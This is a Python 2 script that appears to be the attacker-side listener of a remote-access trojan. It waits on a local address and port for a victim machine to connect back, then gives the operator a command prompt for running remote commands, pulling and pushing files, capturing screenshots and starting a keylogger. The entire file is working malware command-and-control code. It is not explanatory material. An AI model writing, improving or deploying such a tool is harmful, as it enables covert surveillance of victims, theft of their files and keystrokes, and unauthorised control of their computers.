#!/usr/bin/python
import socket
import json
import base64

count = 1

def nam_send(data):
        json_data = json.dumps(data)
        target.send(json_data)

def nam_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data + target.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue

def shell():
	global count
        while True:
                command = raw_input("$KaJackPi^8#~%s: " % str(ip))
                nam_send(command)
                if command == "q":
                        break
                elif command[:2] == "cd" and len(command) > 1:
                        continue
		elif command[:12] == "keylog_start":
			continue
		elif command[:8] == "download":
			with open(command[9:], "wb") as file:
				result =  nam_recv()
				file.write(base64.b64decode(result))
		elif command[:6] == "upload":
			try:
				with open(command[7:], "rb") as fin:
					nam_send(base64.b64encode(fin.read()))
			except:
				failed = "Failed to Upload"
				nam_send(base64.b64encode(failed))
		elif command[:10] == "screenshot":
			with open("screenshot%d" % count, "wb") as screen:
				image = nam_recv()
				image_decoded = base64.b64decode(image)
				if image_decoded[:4] == "[!!]":
					print(image_decoded)
				else:
					screen.write(image_decoded)
					count = count + 1
                else:
                        result = nam_recv()
                        print(result)

def server():
        global imarkelam
        global ip
        global target
        imarkelam = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        imarkelam.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        imarkelam.bind(("192.168.100.12",54321))
        imarkelam.listen(5)
        print("Listening for Incoming connections!")
        target, ip = imarkelam.accept()
        print("Target Connected!")

server()
shell()
imarkelam.close()
